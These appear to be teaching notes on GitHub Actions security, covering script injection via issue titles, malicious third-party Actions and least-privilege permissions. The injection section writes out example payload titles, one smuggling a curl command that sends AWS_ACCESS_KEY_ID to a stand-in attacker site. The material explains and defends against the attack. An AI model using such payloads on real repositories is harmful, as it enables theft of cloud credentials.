# Section 10: Security & Permissions

## Script Injection
```
A value, set outside a Workflow, is used in a Workflow
Example(s):
    - Issue title used in a Workflow shell command
        -- Workflow / command behavior could be changed
```
Example Steps:
1. Create an issue entitled `Something's wrong!`
```
Workflow(script-injection.yml) runs as expected
```
2. Create an issue entitled `a";echo Got your secrets"`
```
Workflow(script-injection.yml) runs with unexpected behavior:
> echo Got your secrets

How it works:
> `a"` closed Workflow(script-injection.yml)'s `issue_title="`
> `;echo Got your secrets` injected unexpected behavior
> trailing `"` closed Workflow's trailing `"`

Original Command:
> issue_title="${{ github.event.issue.title }}"

Final command:
> issue_title="a";echo Got your secrets""
```
3. Create an issue entitled `a"; curl http://my-bad-site.com?abc=$AWS_ACCESS_KEY_ID`
```
How it works:
> Does similar trick as Example 2
> Attacker can extract interpolated environment variable `AWS_ACCESS_KEY_ID` and store it somewhere else
```

## Malicious Third-Party Actions
```
Actions can perform any logic, including potentially malicious logic
Example(s):
    - A third-party Action that reads and exports your secrets
Solution(s):
    - Only use trusted Actions and inspect code of unknown / untrusted authors
```

## Permission Issues
```
Avoid overly permissive permissions (Least Privilege Principle)
Example(s):
    - Only allow checking out code ("read-only")
Solution(s):
    - GitHub Actions supports fine-grained permissions control
```